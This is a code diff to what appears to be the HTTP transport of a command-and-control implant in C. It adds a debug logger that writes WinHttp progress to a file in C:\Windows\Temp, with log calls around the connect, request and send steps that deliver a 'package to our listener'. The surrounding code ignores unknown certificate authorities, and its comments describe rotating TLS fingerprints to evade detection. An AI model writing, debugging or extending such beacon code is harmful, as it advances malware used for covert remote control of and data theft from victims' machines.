@@ -15,6 +15,63 @@
 #include "TransportHttpHelpers.inc.h"
 #undef HTTP_HELPER_SWPRINTF
 
+#ifdef ARCHON_HTTP_LOG
+/* Write a one-line ASCII diagnostic to C:\Windows\Temp\archon-http.txt.
+ * Msg must be a NUL-terminated ASCII string; ErrCode is appended as decimal.
+ * Uses CreateFileW/WriteFile/NtClose via the Win32 dispatch table so it works
+ * in any execution context without libc.  No-op on I/O failure.            */
+static void HttpWriteDebugLog( LPCSTR Msg, DWORD ErrCode ) {
+    HANDLE hFile;
+    DWORD  Written;
+    char   Buf[ 256 ];
+    SIZE_T MsgLen = 0;
+    SIZE_T i;
+    DWORD  tmp;
+    int    digits[ 10 ];
+    int    ndigs = 0;
+
+    while ( Msg[ MsgLen ] && MsgLen < 220 ) {
+        Buf[ MsgLen ] = Msg[ MsgLen ];
+        MsgLen++;
+    }
+    Buf[ MsgLen++ ] = ' ';
+    Buf[ MsgLen++ ] = 'e';
+    Buf[ MsgLen++ ] = 'r';
+    Buf[ MsgLen++ ] = 'r';
+    Buf[ MsgLen++ ] = '=';
+    tmp = ErrCode;
+    if ( tmp == 0 ) {
+        Buf[ MsgLen++ ] = '0';
+    } else {
+        while ( tmp > 0 ) {
+            digits[ ndigs++ ] = (int)( tmp % 10 );
+            tmp /= 10;
+        }
+        for ( i = ndigs - 1; (int)i >= 0; i-- ) {
+            Buf[ MsgLen++ ] = (char)( '0' + digits[ i ] );
+        }
+    }
+    Buf[ MsgLen++ ] = '\n';
+
+    hFile = Instance->Win32.CreateFileW(
+        L"C:\\Windows\\Temp\\archon-http.txt",
+        FILE_APPEND_DATA,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    if ( hFile && hFile != INVALID_HANDLE_VALUE ) {
+        Instance->Win32.WriteFile( hFile, Buf, (DWORD)MsgLen, &Written, NULL );
+        SysNtClose( hFile );
+    }
+}
+#define HTTP_LOG( msg ) HttpWriteDebugLog( (msg), NtGetLastError() )
+#else
+#define HTTP_LOG( msg ) do { } while (0)
+#endif /* ARCHON_HTTP_LOG */
+
 /*!
  * @brief
  *  Rotate the per-connection TLS fingerprint (ARC-06).
@@ -191,8 +248,10 @@ BOOL HttpSend(
 
         if ( ! Instance->hHttpSession ) {
             PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
+            HTTP_LOG( "WinHttpOpen FAILED" );
             goto LEAVE;
         }
+        HTTP_LOG( "WinHttpOpen OK" );
 
         /* ARC-06: apply the randomly chosen TLS protocol-version set to the
          * fresh session so Schannel advertises a different cipher-suite list
@@ -209,6 +268,7 @@ BOOL HttpSend(
     }
 
     /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
+    HTTP_LOG( "WinHttpConnect enter" );
     if ( ! ( Connect = Instance->Win32.WinHttpConnect(
         Instance->hHttpSession,
         Instance->Config.Transport.Host->Host,
@@ -216,8 +276,10 @@ BOOL HttpSend(
         0
     ) ) ) {
         PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
+        HTTP_LOG( "WinHttpConnect FAILED" );
         goto LEAVE;
     }
+    HTTP_LOG( "WinHttpConnect OK" );
 
     while ( TRUE ) {
         if ( ! Instance->Config.Transport.Uris[ Counter ] ) {
@@ -235,6 +297,7 @@ BOOL HttpSend(
     }
 
     /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
+    HTTP_LOG( "WinHttpOpenRequest enter" );
     if ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
         Connect,
         Instance->Config.Transport.Method,
@@ -245,8 +308,10 @@ BOOL HttpSend(
         HttpFlags
     ) ) ) {
         PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
+        HTTP_LOG( "WinHttpOpenRequest FAILED" );
         goto LEAVE;
     }
+    HTTP_LOG( "WinHttpOpenRequest OK" );
 
     if ( Instance->Config.Transport.Secure ) {
         HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
@@ -427,7 +492,9 @@ BOOL HttpSend(
     }
 
     /* Send package to our listener */
+    HTTP_LOG( "WinHttpSendRequest enter" );
     if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
+        HTTP_LOG( "WinHttpSendRequest OK" );
         if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
             if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
@@ -484,6 +551,7 @@ BOOL HttpSend(
         }
 
         PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
+        HTTP_LOG( "WinHttpSendRequest FAILED" );
     }
 
 LEAVE:
